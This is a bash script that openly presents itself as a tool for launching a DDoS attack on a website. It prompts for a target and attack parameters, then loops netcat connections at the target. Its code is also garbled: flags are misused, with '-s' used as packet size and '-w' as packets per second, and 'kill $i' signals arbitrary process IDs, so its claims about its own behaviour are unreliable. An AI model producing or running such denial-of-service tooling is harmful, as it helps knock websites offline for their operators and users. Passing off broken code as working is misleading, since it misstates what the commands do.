#!/bin/bash
# Code to launch a DDoS attack on a website using a bash script

# Ask the user for the target website URL
read -p "Enter the target website URL: " TARGET_URL

# Ask the user for the attacker's IP address
read -p "Enter the attacker's IP address: " ATTACKER_IP

# Ask the user for the attacker's port number
read -p "Enter the attacker's port number: " ATTACKER_PORT

# Ask the user for the target's port number
read -p "Enter the target's port number: " TARGET_PORT

# Ask the user for the attacker's packet size
read -p "Enter the attacker's packet size (in bytes): " ATTACKER_PACKET_SIZE

# Ask the user for the number of attacker threads
read -p "Enter the number of attacker threads: " ATTACKER_THREADS

# Ask the user for the number of packets per second
read -p "Enter the number of packets per second: " PACKETS_PER_SECOND

# Resolve the target website's IP address
TARGET_IP=$(dig +short $TARGET_URL)

# Launch the attack
for (( i=0; i<ATTACKER_THREADS; i++ )); do
    nc -l $i -p $ATTACKER_PORT > /dev/null &
    echo "Attacker $i started"
done

for (( i=0; i<ATTACKER_THREADS; i++ )); do
    nc $TARGET_IP $TARGET_PORT -s $ATTACKER_PACKET_SIZE -w $PACKETS_PER_SECOND &
    echo "Attacker $i started"
done

# Wait for the attack to finish
sleep 60

# Stop the attack
for (( i=0; i<ATTACKER_THREADS; i++ )); do
    kill $i
    echo "Attacker $i stopped"
done
